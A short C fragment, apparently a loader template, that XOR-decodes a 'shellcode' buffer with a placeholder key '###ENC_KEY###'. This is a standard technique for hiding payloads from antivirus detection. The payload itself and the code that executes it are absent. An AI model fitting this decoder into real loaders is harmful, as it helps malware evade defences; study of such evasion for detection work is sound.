char var0[] = "###ENC_KEY###";

int var1 = sizeof(shellcode);
int var2 = sizeof(var0) ;
int var3 = 0;

for (int i = 0; i < var1; i++) {
    if (var3 == var2 - 1) var3 = 0;
    shellcode[i] = shellcode[i] ^ var0[var3];
    var3++;
}
